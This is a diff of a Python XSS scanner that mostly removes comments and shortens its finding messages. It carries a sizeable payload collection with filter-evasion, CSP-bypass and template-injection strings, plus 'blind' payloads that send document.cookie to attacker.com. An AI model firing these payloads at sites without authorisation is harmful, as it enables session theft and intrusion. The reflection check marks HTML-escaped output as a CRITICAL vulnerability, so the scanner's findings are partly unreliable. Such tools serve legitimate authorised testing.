@@ -18,7 +18,6 @@ console = Console()
 # ============================================================================
 
 XSS_PAYLOADS = {
-    # ===== BASIC XSS =====
     "basic": [
         "<script>alert(1)</script>",
         "<script>alert('XSS')</script>",
@@ -26,8 +25,6 @@ XSS_PAYLOADS = {
         "<script>confirm(1)</script>",
         "<script>prompt(1)</script>",
     ],
-    
-    # ===== HTML INJECTION =====
     "html": [
         "<img src=x onerror=alert(1)>",
         "<img src=x onerror=alert(document.domain)>",
@@ -38,23 +35,15 @@ XSS_PAYLOADS = {
         "<object data=javascript:alert(1)>",
         "<embed src=javascript:alert(1)>",
     ],
-    
-    # ===== ENCODED PAYLOADS =====
     "encoded": [
-        # URL Encoded
         "%3Cscript%3Ealert(1)%3C/script%3E",
         "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
-        # Double URL Encoded
         "%253Cscript%253Ealert(1)%253C/script%253E",
-        # HTML Encoded
         "&#60;script&#62;alert(1)&#60;/script&#62;",
         "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
-        # Unicode Encoded
         "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
         "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
     ],
-    
-    # ===== EVENT HANDLERS =====
     "events": [
         "onload=alert(1)",
         "onerror=alert(1)",
@@ -74,8 +63,6 @@ XSS_PAYLOADS = {
         "onresize=alert(1)",
         "onscroll=alert(1)",
     ],
-    
-    # ===== JAVASCRIPT INJECTION =====
     "javascript": [
         "javascript:alert(1)",
         "javascript:alert(document.domain)",
@@ -85,8 +72,6 @@ XSS_PAYLOADS = {
         "data:text/html,<script>alert(1)</script>",
         "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
     ],
-    
-    # ===== POLYGLOTS =====
     "polyglots": [
         "javascript:alert(1)//<script>alert(1)</script>",
         "\" onload=alert(1)>",
@@ -99,8 +84,6 @@ XSS_PAYLOADS = {
         "-->alert(1)//",
         "//<script>alert(1)</script>",
     ],
-    
-    # ===== DOM-BASED XSS =====
     "dom": [
         "#<script>alert(1)</script>",
         "#<img src=x onerror=alert(1)>",
@@ -108,8 +91,6 @@ XSS_PAYLOADS = {
         "#<svg onload=alert(1)>",
         "#<body onload=alert(1)>",
     ],
-    
-    # ===== REFLECTED XSS =====
     "reflected": [
         "?q=<script>alert(1)</script>",
         "?search=<script>alert(1)</script>",
@@ -121,60 +102,39 @@ XSS_PAYLOADS = {
         "?name=<script>alert(1)</script>",
         "?email=<script>alert(1)</script>",
     ],
-    
-    # ===== CONTEXTUAL XSS =====
     "contextual": [
-        # Inside HTML tags
         "\"><script>alert(1)</script>",
         ">\"<script>alert(1)</script>",
-        # Inside attributes
         "\" onload=alert(1)>",
         "' onload=alert(1)>",
-        # Inside script blocks
         "</script><script>alert(1)</script>",
         "';alert(1);//",
         "\";alert(1);//",
-        # Inside CSS
         "expression(alert(1))",
         "url(javascript:alert(1))",
     ],
-    
-    # ===== FRAMEWORK SPECIFIC =====
     "framework": [
-        # React
         "javascript:alert(1)//",
         "onerror=alert(1)//",
-        # Vue
         "{{alert(1)}}",
         "{{constructor.constructor('alert(1)')()}}",
-        # Angular
         "{{constructor.alert(1)}}",
         "{{7*7}}",
-        # jQuery
         "$('<img src=x onerror=alert(1)>')",
         "$.get('javascript:alert(1)')",
     ],
-    
-    # ===== EVASION PAYLOADS =====
     "evasion": [
-        # Case variation
         "<ScRiPt>alert(1)</sCrIpT>",
         "<IMG SRC=x onerror=alert(1)>",
-        # Whitespace variation
         "<script >alert(1)</script>",
         "<img src=x onerror=alert(1) >",
-        # Null bytes
         "%00<script>alert(1)</script>",
         "<scr%00ipt>alert(1)</scr%00ipt>",
-        # Comment tricks
         "<!--<script>alert(1)</script>-->",
         "<!--><script>alert(1)</script>-->",
-        # Double quotes
         "\"<script>alert(1)</script>\"",
         "'<script>alert(1)</script>'",
     ],
-    
-    # ===== STORED XSS =====
     "stored": [
         "<script>alert(1)</script>",
         "<img src=x onerror=alert(1)>",
@@ -183,16 +143,12 @@ XSS_PAYLOADS = {
         "<iframe src=javascript:alert(1)>",
         "javascript:alert(1)",
     ],
-    
-    # ===== BLIND XSS =====
     "blind": [
         "<script>fetch('https://attacker.com/log?c='+document.cookie)</script>",
         "<img src=x onerror='fetch(\"https://attacker.com/log?c=\"+document.cookie)'>",
         "<svg onload='fetch(\"https://attacker.com/log?c=\"+document.cookie)'>",
         "<script>new Image().src='https://attacker.com/log?c='+document.cookie</script>",
     ],
-    
-    # ===== CSP BYPASS =====
     "csp_bypass": [
         "<script>alert(1)</script>",
         "<script>document.write('<img src=x onerror=alert(1)>')</script>",
@@ -220,27 +176,22 @@ XSS_PARAMETERS = [
     "next", "token", "apikey", "search", "q",
     "query", "filter", "sort", "order", "lang",
     "debug", "name", "title", "content", "body",
-    
     # Search parameters
     "search", "q", "query", "keyword", "keywords",
     "term", "filter", "category", "tag", "label",
-    
     # ID parameters
     "id", "uid", "user_id", "userid", "account_id",
     "profile_id", "post_id", "order_id", "invoice_id",
     "ticket_id", "project_id", "document_id", "item_id",
     "product_id", "category_id", "page_id", "comment_id",
-    
     # Redirect parameters
     "redirect", "url", "next", "return", "returnTo",
     "continue", "destination", "callback", "goto",
     "forward", "to", "target", "href", "link",
-    
     # API parameters
     "apikey", "api_key", "token", "access_token",
     "refresh_token", "client_id", "client_secret",
     "grant_type", "scope", "state", "nonce",
-    
     # Misc parameters
     "debug", "test", "dev", "staging", "sandbox",
     "admin", "root", "super", "master", "backup",
@@ -248,9 +199,6 @@ XSS_PARAMETERS = [
     "order", "invoice", "payment", "checkout",
 ]
 
-# ============================================================================
-# XSS SCANNER CLASS
-# ============================================================================
 
 class XSSScanner:
     """Comprehensive XSS Scanner with payload testing"""
@@ -270,16 +218,9 @@ class XSSScanner:
         """Run comprehensive XSS scan"""
         console.print(f"[cyan]Scanning for XSS vulnerabilities on: {self.target_url}[/cyan]")
         
-        # Step 1: Test URL parameters
         self._test_url_parameters()
-        
-        # Step 2: Test form submissions
         self._test_forms()
-        
-        # Step 3: Test reflected parameters
         self._test_reflected()
-        
-        # Step 4: Test DOM-based vectors
         self._test_dom_based()
         
         return self.findings
@@ -293,7 +234,6 @@ class XSSScanner:
                 continue
             self.tested_params.add(param)
             
-            # Test with multiple payload types
             payload_groups = ['basic', 'encoded', 'javascript', 'polyglots', 'contextual']
             
             for group in payload_groups:
@@ -310,11 +250,11 @@ class XSSScanner:
                             "url": test_url,
                             "severity": "CRITICAL",
                             "confidence": 90 if group in ['basic', 'javascript'] else 75,
-                            "description": f"XSS vulnerability found in parameter '{param}' with payload: {payload[:50]}...",
+                            "description": f"XSS vulnerability found in parameter '{param}'",
                             "timestamp": datetime.now().isoformat()
                         })
                         console.print(f"[red]XSS FOUND: {param} = {payload[:30]}...[/red]")
-                        break  # Break if found for this parameter
+                        break
                 if param in self.vulnerable_params:
                     break
     
@@ -326,15 +266,12 @@ class XSSScanner:
             response = self.session.get(self.target_url, timeout=self.timeout)
             html = response.text
             
-            # Find all forms
             form_pattern = r'<form[^>]*action="([^"]*)"[^>]*>'
             forms = re.findall(form_pattern, html)
             
             for form_action in forms:
                 if form_action:
                     action_url = urllib.parse.urljoin(self.target_url, form_action)
-                    
-                    # Find form inputs
                     input_pattern = r'<input[^>]*name="([^"]*)"[^>]*>'
                     inputs = re.findall(input_pattern, html)
                     
@@ -362,7 +299,6 @@ class XSSScanner:
         """Test for reflected XSS"""
         console.print("[cyan]Testing for reflected XSS...[/cyan]")
         
-        # Use common patterns that might be reflected
         reflection_patterns = [
             f"{self.target_url}?q=<script>alert(1)</script>",
             f"{self.target_url}?search=<script>alert(1)</script>",
@@ -383,7 +319,7 @@ class XSSScanner:
                         "url": test_url,
                         "severity": "CRITICAL",
                         "confidence": 80,
-                        "description": f"Reflected XSS found: {test_url[:100]}...",
+                        "description": f"Reflected XSS found",
                         "timestamp": datetime.now().isoformat()
                     })
                     console.print(f"[red]Reflected XSS found: {test_url[:60]}...[/red]")
@@ -415,7 +351,7 @@ class XSSScanner:
                         "url": test_url,
                         "severity": "CRITICAL",
                         "confidence": 75,
-                        "description": f"DOM-based XSS vector: {vector[:50]}...",
+                        "description": f"DOM-based XSS vector found",
                         "timestamp": datetime.now().isoformat()
                     })
                     console.print(f"[red]DOM XSS vector found: {vector[:30]}...[/red]")
@@ -432,20 +368,14 @@ class XSSScanner:
             response = self.session.get(url, timeout=self.timeout)
             html = response.text
             
-            # Check if payload is reflected in HTML
             if payload in html:
                 return True
-            
-            # Check for encoded payload
             encoded = urllib.parse.quote(payload)
             if encoded in html:
                 return True
-            
-            # Check for HTML-encoded
             html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
             if html_encoded in html:
                 return True
-            
             return False
         except:
             return False
@@ -460,7 +390,6 @@ class XSSScanner:
             r'javascript:alert\(\d+\)',
             r'<div[^>]*onmouseover=alert\(\d+\)',
         ]
-        
         for pattern in xss_patterns:
             if re.search(pattern, html, re.IGNORECASE):
                 return True
@@ -481,7 +410,6 @@ class XSSScanner:
             r'setTimeout\s*\(\s*["\']',
             r'setInterval\s*\(\s*["\']',
         ]
-        
         for pattern in dom_patterns:
             if re.search(pattern, html, re.IGNORECASE):
                 return True
@@ -525,7 +453,6 @@ class XSSScanner:
         
         console.print(table)
         
-        # Summary
         summary = self.get_summary()
         console.print(f"\n[bold]📊 Scan Summary:[/bold]")
         console.print(f"  • Vulnerable Parameters: {len(summary['vulnerable_params'])}")
